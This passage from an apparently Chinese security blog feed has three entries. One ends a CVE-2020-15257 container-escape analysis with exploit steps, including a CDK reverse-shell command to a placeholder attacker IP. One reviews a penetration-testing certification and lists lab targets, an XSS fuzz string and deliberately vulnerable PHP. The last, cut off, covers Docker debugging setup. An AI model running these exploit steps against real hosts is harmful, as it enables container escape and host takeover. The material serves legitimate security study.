class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，containerd-shim做为server向外提供服务，containerd做为client，调用containerd-shim提供的API实现对容器的间接管理。</p><p>抽象Unix域套接字没有权限限制，所以只能靠连接进程的UID、GID做访问控制，限定了只能是root（UID=0，GID=0）用户才能连接成功。</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go">containerd/unixcreds_linux.go at v1.4.2 · containerd/containerd · GitHub</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireUidGid requires specific *effective* UID/GID, rather than the real UID/GID.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For example, if a daemon binary is owned by the root (UID 0) with SUID bit but running as an</span></span><br><span class="line"><span class="comment">// unprivileged user (UID 1001), the effective UID becomes 0, and the real UID becomes 1001.</span></span><br><span class="line"><span class="comment">// So calling this function with uid=0 allows a connection from effective UID 0 but rejects</span></span><br><span class="line"><span class="comment">// a connection from effective UID 1001.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// See socket(7), SO_PEERCRED: &quot;The returned credentials are those that were in effect at the time of the call to connect(2) or socketpair(2).&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireUidGid</span><span class="params">(uid, gid <span class="keyword">int</span>)</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> requireUidGid(ucred, uid, gid)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">  euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line">  <span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line">    <span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过访问/proc/net/unix文件，可以获取到当前网络命名空间下所有的Unix域套接字信息。</p><p>在默认情况下，docker run启动的容器的网络模式是bridge，容器和主机之间实现了网络隔离，所以在容器内部读取/proc/net/unix文件，看不到任何信息，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu ~<span class="comment"># docker run -it --rm busybox cat /proc/net/unix</span></span><br><span class="line">Num       RefCount Protocol Flags    Type St Inode Path</span><br></pre></td></tr></table></figure><p>但是在host模式下，由于容器和主机共享同一个网络命名空间，容器能访问到主机中的所有网络资源，所以在容器内部读取/proc/net/unix文件，显示的就是真实主机中的信息，如下所示：</p><p><img src="/img/linux-namespace/e2eaa1ec84b1518bff3a27a41b453e3f9bdd417c.png" class="lazyload" data-srcset="/img/linux-namespace/e2eaa1ec84b1518bff3a27a41b453e3f9bdd417c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="loading-ag-5574"></p><ul><li>/var/run/docker.sock：Docker Daemon监听的Unix域套接字，用于Docker client之间通信；</li><li>/run/containerd/containerd.sock：containerd监听的Unix域套接字，Docker Daemon、ctr可以通过它和containerd通信；</li><li>@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock：</li></ul><p>这个就是上文所述的，containerd-shim监听的Unix域套接字，containerd通过它和containerd-shim通信，控制管理容器。</p><p>/var/run/docker.sock、/run/containerd/containerd.sock这两者是普通的文件路径，虽然容器共享了主机的网络命名空间，<strong>但没有共享mnt命名空间，容器和主机之间的磁盘挂载点和文件系统仍然存在隔离</strong>，所以在容器内部仍然不能通过/var/run/docker.sock、/run/containerd/containerd.sock这样的路径连接对应的Unix域套接字。</p><p>也就是说:</p><ul><li>host模式下，容器共享了主机的网络命名空间，也就能够去连接</li></ul><p>@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</p><p>这一类的抽象Unix域套接字。</p><ul><li>而且在默认情况下，容器内部的进程都是以root用户启动的，所以也能通过UnixSocketRequireSameUser的校验。</li></ul><p>在这两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>推荐阅读：<a href="https://www.cdxy.me/?p=837">CVE-2020-15257 EXP 开发</a> ，因为与 containerd-shim 通信与dockerd通信有点不一样，构造传参麻烦些，需要知道containerd-shim的入参</p><p>下面直接用集成至 cdk 的 exp 演示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --net=host --name=15257 ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>在容器内执行命令cat /proc/net/unix|grep -a “containerd-shim”，查看结果确认是否可看到抽象命名空间Unix域套接字</p><p>在攻击端监听1234端口，然后下载漏洞利用工具CDK，并将其传入容器/tmp目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp cdk_linux_amd64 15257:/tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it 15257 bash</span><br></pre></td></tr></table></figure><p>运行工具，执行反弹shell命令,验证得到一个宿主机的shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./cdk_linux_amd64 run shim-pwn reverse &lt;attacker-ip&gt; &lt;port&gt;</span><br></pre></td></tr></table></figure><p>注：关于该漏洞在利用时出现类似以下内容的问题，可以暂时参考<a href="https://github.com/brant-ruan/metarget/issues/74">issue #74</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpc error: code = Unknown desc = OCI runtime create failed: <span class="built_in">exec</span>: <span class="string">&quot;runc&quot;</span>: executable file not found <span class="keyword">in</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/containerd/containerd/commit/4a4bb851f5da563ff6e68a83dc837c7699c469ad">https://github.com/containerd/containerd/commit/4a4bb851f5da563ff6e68a83dc837c7699c469ad</a></p><p>在最新发布的1.3.9和1.4.3版本中，抽象Unix域套接字已经改成了普通文件路径的Unix域套接字</p><p>因为containerd和containerd-shim都在容器外部，所以它们之间的连接、通信不受影响；因为有mnt命名空间的隔离，所以在host模式下，容器内部也无法访问普通文件路径的Unix域套接字。也就修复了上述漏洞。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://en.wikipedia.org/wiki/Linux_namespaces">https://en.wikipedia.org/wiki/Linux_namespaces</a></p><p>[2] <a href="http://lwn.net/2001/0301/a/namespaces.php3">http://lwn.net/2001/0301/a/namespaces.php3</a></p><p>[3] <a href="http://lwn.net/Articles/179345/">http://lwn.net/Articles/179345/</a></p><p>[4] <a href="http://lwn.net/Articles/259217/">http://lwn.net/Articles/259217/</a></p><p>[5] <a href="http://lwn.net/Articles/187274/">http://lwn.net/Articles/187274/</a></p><p>[6] <a href="http://lwn.net/Articles/219794/">http://lwn.net/Articles/219794/</a></p><p>[7] <a href="http://lwn.net/Articles/528078/">http://lwn.net/Articles/528078/</a></p><p>[8] <a href="https://lkml.org/lkml/2016/3/18/564">https://lkml.org/lkml/2016/3/18/564</a></p><p>[9] <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Time-Namespace-In-Linux-5.6">https://www.phoronix.com/scan.php?page=news_item&amp;px=Time-Namespace-In-Linux-5.6</a></p><p>[10] <a href="https://www.quora.com/Is-it-possible-to-kill-the-init-process-in-Linux-by-the-kill-9-command">https://www.quora.com/Is-it-possible-to-kill-the-init-process-in-Linux-by-the-kill-9-command</a></p><p>[11] <a href="https://blog.csdn.net/liumiaocn/article/details/52549196">https://blog.csdn.net/liumiaocn/article/details/52549196</a></p><p>[12] <a href="https://lwn.net/Articles/531826/">https://lwn.net/Articles/531826/</a></p><p>[13] <a href="https://coolshell.cn/articles/17010.html">https://coolshell.cn/articles/17010.html</a></p><p>[14] <a href="https://coolshell.cn/articles/17029.html">https://coolshell.cn/articles/17029.html</a></p><p>[15] <a href="https://mp.weixin.qq.com/s/49F3eZ3ZWyp1V5irxBC20Q">https://mp.weixin.qq.com/s/49F3eZ3ZWyp1V5irxBC20Q</a></p><p>[16] <a href="https://segmentfault.com/a/1190000006917884">https://segmentfault.com/a/1190000006917884</a></p><p>[17] <a href="https://www.cnblogs.com/sammyliu/p/5886833.html">https://www.cnblogs.com/sammyliu/p/5886833.html</a></p><p>[18] <a href="https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA">https://mp.weixin.qq.com/s/mSlc2RMRDe6liXb-ejtRvA</a></p><p>[19] <a href="https://www.cnblogs.com/sammyliu/category/882904.html">https://www.cnblogs.com/sammyliu/category/882904.html</a></p><p>[20] <a href="https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ">https://mp.weixin.qq.com/s/WmSaLPnG4o4Co1xRiYCOnQ</a></p><p>[21] <a href="https://www.cdxy.me/?p=837">https://www.cdxy.me/?p=837</a></p><p>[22] <a href="https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/">https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/</a></p>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
            <tag> Docker </tag>
            
            <tag> Linux命名空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISP-PTS考证记</title>
      <link href="//p/2022/cisp-pts/"/>
      <url>//p/2022/cisp-pts/</url>
      
        <content type="html"><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://www.nisp.org.cn/Content/1964488.html">CISP-PTS 国家注册渗透测试专家</a> 介绍可戳</p><p>先来总结一下考证经历，试题难度还是有的，不过因为是报班考的（也只能通过培训机构报），所以，很多题目都在平常练习中会有涉及，考前也会有一些特训啥的，考起来也不是说特别难</p><ul><li>截止至2023年的持证数量比例，<a href="http://www.itsec.gov.cn/search/search?channelid=279872&searchword=pts">据中国信息安全评测中心数据</a>，目前PTS和PTE持证人数大概是 350 和 4900 左右</li><li>关于培训和考试时间，当时找了好几家培训机构，发现他们培训时间多数都是工作日的，想找周末的，最终同事找了家机构，然后一起抱团考，还可以打个折。不过考试时间，基本都是工作日的，其实也还好，考试 4 个小时，请半天假就OK</li><li>关于价格，一般在 1.6W — 2.5W 不等，我们是挑了便宜的（主要是培训时间刚好在周末，这很人性化）</li><li>关于考试题型，考的时候一共需要拿到10个key（flag），在4个综合题目中，前面两个综合体就是常规的Web题了，题目可参考 <a href="https://zhuanlan.zhihu.com/p/450746039">https://zhuanlan.zhihu.com/p/450746039</a> 0X04综合大题（一）和 0X05综合大题（二）。大题考点会涉及流量转发打内网的应用</li><li>关于考试环境，以往都是线下考试，我们恰好碰上疫情改为线上考（需要双机位拍摄，一个拍自己，一个拍电脑屏幕）。是先登录到考试环境，在考试环境里的虚拟机Win和Kali上操作，Win和Kali与考试的题目处于同一个内网，只有最后一个大题有Kali，剩下的都是装有渗透工具箱的Win7，考试不出网，也不能查资料，这就是考试的难点了，啥利用方式都是要能背出来，而且只能用考试环境的工具，不过肯定是能让我们解出题目的。</li><li>关于考证周期，拿证时间一般是通过后3-4个月可以拿到，培训一般断断续续1个来月</li></ul><p>其他事项的话，基本跟着机构老师走就OK，还有想了解的可以留言～</p><h2 id="练习汇总"><a href="#练习汇总" class="headerlink" title="练习汇总"></a>练习汇总</h2><p>在考PTS过程中，跟着老师做了挺多练习的，我这边顺藤摸瓜，找到原题并汇总了一下～</p><h3 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h3><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p><ul><li><p><a href="https://vulhub.org/#/environments/httpd/ssi-rce/">https://vulhub.org/#/environments/httpd/ssi-rce/</a> </p></li><li><p><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</a> HTTPD 换行解析</p></li><li><p><a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</a></p></li><li><p><a href="https://vulhub.org/#/environments/nginx/insecure-configuration/">https://vulhub.org/#/environments/nginx/insecure-configuration/</a> </p></li><li><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</a> 测试页任意文件上传</p></li><li><p><a href="https://vulhub.org/#/environments/tomcat/CVE-2017-12615/">https://vulhub.org/#/environments/tomcat/CVE-2017-12615/</a> PUT 任意文件写</p></li><li><p><a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</a> MySQL错误密码登陆</p></li><li><p><a href="https://vulhub.org/#/environments/tomcat/tomcat8/">https://vulhub.org/#/environments/tomcat/tomcat8/</a> 部署waf包任意文件上传</p></li><li><p><a href="https://vulhub.org/#/environments/weblogic/ssrf/">https://vulhub.org/#/environments/weblogic/ssrf/</a> Weblogic SSRF</p></li><li><p><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a> phpmyadmin 4.8.1 远程文件包含</p></li></ul><h3 id="sqli-labs靶场"><a href="#sqli-labs靶场" class="headerlink" title="sqli-labs靶场"></a>sqli-labs靶场</h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><ul><li><input checked="" disabled="" type="checkbox"> /Less-1/ 联合注入</li><li><input checked="" disabled="" type="checkbox"> /Less-5/ 报错注入</li><li><input checked="" disabled="" type="checkbox"> /Less-6/ 布尔注入</li><li><input checked="" disabled="" type="checkbox"> /Less-9/ 时间注入</li><li><input checked="" disabled="" type="checkbox"> /Less-24/ 二次注入</li><li><input checked="" disabled="" type="checkbox"> /Less-32/ 宽字节注入</li><li><input checked="" disabled="" type="checkbox"> /Less-38/ 堆叠注入</li><li><input checked="" disabled="" type="checkbox"> /Less-54/ 联合注入巩固（10步内注出数据）</li></ul><h3 id="upload-labs靶场"><a href="#upload-labs靶场" class="headerlink" title="upload-labs靶场"></a>upload-labs靶场</h3><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><ul><li><input checked="" disabled="" type="checkbox"> /Pass-01/index.php 文件上传前端绕过</li><li><input checked="" disabled="" type="checkbox"> /Pass-02/index.php 文件上传MIME绕过</li><li><input checked="" disabled="" type="checkbox"> /Pass-03/index.php 文件上传phtml绕过</li><li><input checked="" disabled="" type="checkbox"> /Pass-04/index.php 文件上传.htaccess绕过</li><li><input checked="" disabled="" type="checkbox"> /Pass-10/index.php 文件上传双写绕过</li><li><input checked="" disabled="" type="checkbox"> /Pass-13/index.php 文件上传 图片马 Content-Type （GIF89a，FFD8FFE0）+ 文件包含</li></ul><h3 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h3><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a> </p><p>level1-7 ，都可通过 <code>&#39;&#39;;!--&quot;&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</code> fuzz一下闭合方式，第3/4关注意事件要刚好用引号括起来</p><h3 id="Pikachu"><a href="#Pikachu" class="headerlink" title="Pikachu"></a>Pikachu</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p><ul><li><input checked="" disabled="" type="checkbox"> Pikachu File Inclusion(remote)</li></ul><p>（Pikachu是部署在本机的，记得开启一下远程包含相关配置）</p><ul><li><input checked="" disabled="" type="checkbox"> Pikachu 存储型XSS利用管理员Cookie登陆后台</li><li><input checked="" disabled="" type="checkbox"> Pikachu File Inclusion(local)</li></ul><h3 id="《从0到1：CTFer成长之路》配套练习"><a href="#《从0到1：CTFer成长之路》配套练习" class="headerlink" title="《从0到1：CTFer成长之路》配套练习"></a>《从0到1：CTFer成长之路》配套练习</h3><ul><li><p><input checked="" disabled="" type="checkbox">  sql联合注入 (<a href="https://book.nu1l.com/tasks/#/pages/web/1.2?id=sql%e6%b3%a8%e5%85%a5-1">https://book.nu1l.com/tasks/#/pages/web/1.2?id=sql%e6%b3%a8%e5%85%a5-1</a>)</p></li><li><p><input checked="" disabled="" type="checkbox">  sql盲注 (<a href="https://book.nu1l.com/tasks/#/pages/web/1.2?id=sql%e6%b3%a8%e5%85%a5-2">https://book.nu1l.com/tasks/#/pages/web/1.2?id=sql%e6%b3%a8%e5%85%a5-2</a>)</p></li><li><p><input checked="" disabled="" type="checkbox">  文件包含伪协议 (<a href="https://book.nu1l.com/tasks/#/pages/web/1.3?id=afr_1">https://book.nu1l.com/tasks/#/pages/web/1.3?id=afr_1</a>)</p></li><li><p><input checked="" disabled="" type="checkbox">  PHP源码审计 代码 知识点/Web安全 文件上传-1 (<a href="https://book.nu1l.com/tasks/#/pages/web/2.3">https://book.nu1l.com/tasks/#/pages/web/2.3</a>) 考试可用16进制编辑器修改zip包的文件名为目录穿越文件名，提前留好 <code>../</code>  文件名占位符号即可</p><ul><li><input checked="" disabled="" type="checkbox"> 包含知识点 <a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a> HTTPD 多后缀解析漏洞</li></ul></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><input checked="" disabled="" type="checkbox"> LFI - 2016xctf index.php 简单版</li></ul><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">show_source(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&#x27;the user is admin&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><input checked="" disabled="" type="checkbox"> PHAR LFI - 题解 <a href="https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/">https://chybeta.github.io/2017/08/16/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-Document-writeup/</a> —— <a href="/static/2022/08/16/phar-lfi.7z">题目代码下载</a></li></ul><h3 id="综合题练习靶场"><a href="#综合题练习靶场" class="headerlink" title="综合题练习靶场"></a>综合题练习靶场</h3><ul><li><input checked="" disabled="" type="checkbox"> 一个综合题目练习靶场原型是<a href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a> ，不过注入更简单，提权少了提权至mike这一步</li><li><input checked="" disabled="" type="checkbox"> <a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a> 红日安全靶机</li><li><input checked="" disabled="" type="checkbox"> <a href="https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/">https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">https://www.vulnhub.com/entry/hacknos-os-bytesec,393/</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https://www.vulnhub.com/entry/prime-1,358/">https://www.vulnhub.com/entry/prime-1,358/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 考证 </category>
          
          <category> CISP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker (远程) Debug 调试环境搭建</title>
      <link href="//p/2022/goland-docker-debug/"/>
      <url>//p/2022/goland-docker-debug/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>为了更深入和清晰的理解 Docker K8S 等组件漏洞的原理，通过我会选择 Debug 它们的源码进行断点调试追踪代码层面的调用逻辑。</p><p>刚开始学Go的时候一直很不理解Go的项目结构，跑或者去调试开源Go项目有隔阂感，低版本Docker因没有Go Module，采用较为原始的Go Vendor依赖管理方式，最近才开始学Go的我来说也是陌生，在加上<a href="https://github.com/docker/docker-ce">Docker 20.10<sup>[1]</sup></a>项目重构之后分为多个组件（不直接用docker-ce源码是因为用新的可以一套代码新旧代码一起调），搭建起来也麻烦少许，Docker之间各个组件之间的调用方式又有点不同，导致搭建起来比较麻烦。后面学K8S这些发现调试环境搭建思路一样，一通百通，于是就总结一下。</p><p>本文环境</p><ul><li>Goland IDE</li><li>Ubuntu 18.04</li></ul><p>相信大多数人和我一样主力机用Win或者Mac，但Docker底层依赖Linux命名空间，所以在runC层面的漏洞需要Linux环境，这里通过本机Goland远程连至Ubuntu进行。直接在Ubuntu装Goland也可以。不是Ubuntu也不要紧，只是下文中安装的依赖包名可能有点不同。</p><h2 id="0x02-Docker架构组成"><a href="#0x02-Docker架构组成" class="headerlink" title="0x02 Docker架构组成"></a>0x02 Docker架构组成</h2><p>调试之前，需要了解下 Docker 的组成，即组件的作用，这样有助于复现时理解漏洞所处在Docker组件</p><p><img src="/img/goland-docker-debug/image-20220707232706988.png" class="lazyload" data-srcset="/img/goland-docker-debug/image-20220707232706988.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220707232706988"></p><p>Docker 架构可分为 4 个仓库</p><ul><li><a href="https://github.com/docker/cli">https://github.com/docker/cli</a> - 上图中的 Docker</li><li><a href="https://github.com/moby/moby">https://github.com/moby/moby</a> -  即我们熟知的 Dockerd 守护进程，Docker服务</li><li><a href="https://github.com/containerd/containerd">https://github.com/containerd/containerd</a> - 包含 Containerd 和 Containerd-shim</li><li><a href="https://github.com/opencontainers/runc">https://github.com/opencontainers/runc</a></li></ul><p>Docker 于 2013年开源一种可移植、灵活且易于部署的容器化项目 libcontainer，并于 2015年把代码捐赠给OCI（Open Container Initiative）以助力容器生态标准化。Contianerd 最初也是 Docker 的核心库，于 2017 年捐赠给 CNCF（Cloud Native Computing Foundation）。<a href="https://www.docker.com/resources/what-container/"><sup>[2]</sup></a> </p><p>他们最初都为 Docker 的一部分，为更好构建云原生生态最终演变为几个不同的组件。</p><h2 id="0x03-Goland-Docker调试环境搭建"><a href="#0x03-Goland-Docker调试环境搭建" class="headerlink" title="0x03 Goland Docker调试环境搭建"></a>0x03 Goland Docker调试环境搭建</h2><p>因为 docker engine 需要 root 权限，请以 root 用户身份执行以下命令</p><h3 id="Golang-安装"><a href="#Golang-安装" class="headerlink" title="Golang 安装"></a>Golang 安装</h3><p>许多漏洞环境需要的 go 版本较高，源安装较低，先手动安装 go</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.17.9.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvf go1.17.9.linux-amd64.tar.gz -C /usr/<span class="built_in">local</span>/</span><br></pre></td></tr></table></figure><p>让 go 可执行文件能在 <code>$PATH</code> 索引</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/<span class="built_in">local</span>/go/bin/go /usr/bin/go</span><br></pre></td></tr></table></figure><p>命令行运行 <code>go</code> 能正常回显即可</p><h3 id="Goland-Docker-源码下载"><a href="#Goland-Docker-源码下载" class="headerlink" title="Goland Docker 源码下载"></a>Goland Docker 源码下载</h3><p>如0x02节介绍，要完整调试 Docker 源码，我们需要把四个仓库都拷贝下来，又因Docker低版本使用Go Vendor进行依赖管理，因此需要创建Go 项目源码结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/docker-moby/src/github.com/docker</span><br><span class="line">mkdir -p /opt/docker-cli/src/github.com/docker</span><br><span class="line">mkdir -p /opt/docker-containerd/src/github.com/containerd</span><br><span class="line">mkdir -p /opt/docker-runc/src/github.com/opencontainers</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/moby/moby.git /opt/docker-moby/src/github.com/docker/docker</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/docker/cli.git /opt/docker-cli/src/github.com/docker/cli</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/containerd/containerd.git /opt/docker-containerd/src/github.com/containerd/containerd</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/opencontainers/runc.git /opt/docker-runc/src/github.com/opencontainers/runc</span><br></pre></td></tr></table></figure><p>完成后目录结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 